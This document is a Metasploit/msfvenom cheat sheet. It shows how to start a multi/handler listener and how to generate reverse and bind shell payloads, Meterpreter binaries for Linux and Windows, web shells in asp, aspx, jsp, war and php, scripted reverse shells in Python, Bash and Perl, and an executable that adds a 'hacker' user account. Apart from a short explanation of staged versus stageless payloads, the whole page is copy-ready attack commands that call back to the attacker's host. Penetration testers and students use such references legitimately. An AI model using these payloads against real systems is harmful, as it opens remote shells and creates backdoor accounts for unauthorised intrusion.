# Metasploit Handler:

LHOST=local host

LPORT=local port

RHOST=remote host

RPORT=remote port

```
msfconsole -q
show options
show payloads
use exploit/multi/handler
set PAYLOAD <Payload name>
show options
Set RHOST <Remote IP>
set LHOST <Local IP>
set LPORT <Local Port>
Run
```

## List payloads:
```
msfvenom -l
```

## search for cmd/unix payloads
```
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
```

## look at payload options:
```
msfvenom --payload-options -p windows/shell/reverse_tcp
```

## Staged payloads: 
Staged payloads are denoted with the use of a forward slash (/; e.g. windows/shell/reverse_tcp). Staged payloads send a small stager to the target, which connects back to the attacker and downloads the rest of the payload. Therefore, staged payloads need special payload listeners, such as multi/handler in Metasploit. Staged payloads are ideal in situations where you have limited shellcode space, most commonly in Buffer Overflows.

## Stageless payloads:
Stageless payloads are denoted with the use of an underscore (_; e.g. windows/shell_reverse_tcp). Stageless payloads send the entire payload to the target at once, and therefore don’t require the attacker to provide more data. That means we have a variety of listeners we can use, such as Netcat.

# Non-Meterpreter Binaries
## Stageless Payloads for Linux:
```
x86 	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64 	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## Stageless Payloads for Windows:
```
x86 	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64 	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

## Staged Payloads for Linux:
```
x86	msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64 	msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## Staged Payloads for Windows:
```
x86	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

## Web Payloads:
```
asp	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
asp	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
aspx	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
aspx	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
war	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
php	msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

## Scripting Payloads:
```
Python	msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py
Bash	msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
Perl	msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.pl
```

## Binaries Payloads:
```
Linux Bind Shell	msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > term.elf
Windows Reverse Shell	msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
```

## Create User
```
msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe
```


# Meterpreter Binaries
## Staged Payloads for Windows:
```
x86	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

## Stageless Payloads for Windows:
```
x86	msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

## Staged Payloads for Linux:
```
x86	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## Stageless Payloads for Linux:
```
x86	msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## Meterpreter Web Payloads:
```
asp	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
war	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war
php	msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
